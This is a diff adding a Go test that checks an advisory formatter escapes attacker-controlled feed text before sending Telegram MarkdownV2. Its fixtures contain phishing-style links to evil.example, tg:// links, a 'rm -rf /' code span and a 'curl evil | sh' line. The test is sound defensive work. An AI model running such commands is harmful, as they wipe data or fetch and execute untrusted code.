@@ -187,6 +187,47 @@ func TestFormatAdvisoryNeverExceedsTelegramLimit(t *testing.T) {
 	}
 }
 
+// TestFormatAdvisoryNeutralisesMarkupInFeedText guards against feed-controlled
+// text becoming live MarkdownV2: an attacker who controls the upstream (or a
+// custom feed_url) must not be able to plant links or code spans.
+func TestFormatAdvisoryNeutralisesMarkupInFeedText(t *testing.T) {
+	t.Parallel()
+	a := sampleAdvisory()
+	a.Title = "Evil [click here](https://evil.example/login) - PSA-2026-01-01"
+	a.ProjectName = "Mod `rm -rf /` ule"
+	a.Vulnerability = "[XSS](tg://user?id=1)"
+	a.RiskLabel = "Critical [x](y)"
+	a.Description = "See [update now](https://evil.example/login) and `code` here."
+	a.Solution = "[fix](tg://user?id=1)\n```\ncurl evil | sh\n```"
+	a.CVEs = []string{"CVE-2026-1 [z](w)"}
+
+	msg := FormatAdvisory(a)
+
+	for _, live := range []string{
+		"[click here](", "[update now](", "[XSS](", "[x](", "[fix](", "[z](",
+		"`code`", "`rm -rf /`", "```",
+	} {
+		if strings.Contains(msg, live) {
+			t.Errorf("feed text rendered as live markup %q:\n%s", live, msg)
+		}
+	}
+	// The only link allowed is the advisory link we build ourselves.
+	if got := strings.Count(msg, "]("); got != 1 {
+		t.Errorf("link count = %d, want exactly the 🔗 Advisory link:\n%s", got, msg)
+	}
+	// Only our own code spans (machine name, affected versions) may carry
+	// live backticks; every backtick from feed text must be escaped.
+	if live := strings.Count(msg, "`") - strings.Count(msg, "\\`"); live != 4 {
+		t.Errorf("live backticks = %d, want 4 (two code spans):\n%s", live, msg)
+	}
+	assertEscaped(t, msg)
+
+	notice := FormatSeedNotice(3, a)
+	if strings.Contains(notice, "[click here](") || strings.Count(notice, "](") != 1 {
+		t.Errorf("seed notice leaked feed markup:\n%s", notice)
+	}
+}
+
 func TestFormatSeedNotice(t *testing.T) {
 	t.Parallel()
 	msg := FormatSeedNotice(50, sampleAdvisory())
